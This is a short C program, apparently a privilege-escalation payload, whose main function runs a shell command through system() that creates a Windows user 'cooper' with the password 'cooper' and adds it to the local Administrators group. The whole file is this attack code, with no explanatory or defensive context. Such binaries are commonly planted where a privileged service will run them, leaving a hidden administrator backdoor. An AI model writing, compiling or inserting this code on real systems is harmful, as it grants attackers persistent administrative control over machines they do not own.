#include <stdlib.h>
int main()
{
int i;
    i = system("net user /add cooper cooper && net localgroup administrators cooper /add");
return 0;
}
